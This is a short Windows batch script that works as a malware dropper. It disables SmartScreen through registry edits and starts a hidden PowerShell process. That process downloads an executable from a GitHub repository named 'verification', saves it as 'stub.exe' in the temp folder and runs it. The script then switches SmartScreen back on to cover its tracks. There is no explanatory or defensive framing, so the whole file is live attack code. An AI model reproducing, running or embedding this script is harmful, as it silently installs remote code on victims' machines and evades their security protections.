@echo off
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "Off" /f
reg add "HKCU\Software\Microsoft\Windows Defender\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d 0 /f

start /min "" powershell -WindowStyle Hidden -Command "Invoke-WebRequest -Uri 'https://github.com/centralskid/verification/raw/refs/heads/main/huj.exe' -OutFile '%TEMP%\stub.exe'; if (Test-Path '%TEMP%\stub.exe') { Start-Process '%TEMP%\stub.exe' }"

reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer" /v "SmartScreenEnabled" /t REG_SZ /d "RequireAdmin" /f
reg add "HKCU\Software\Microsoft\Windows Defender\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d 1 /f

exit
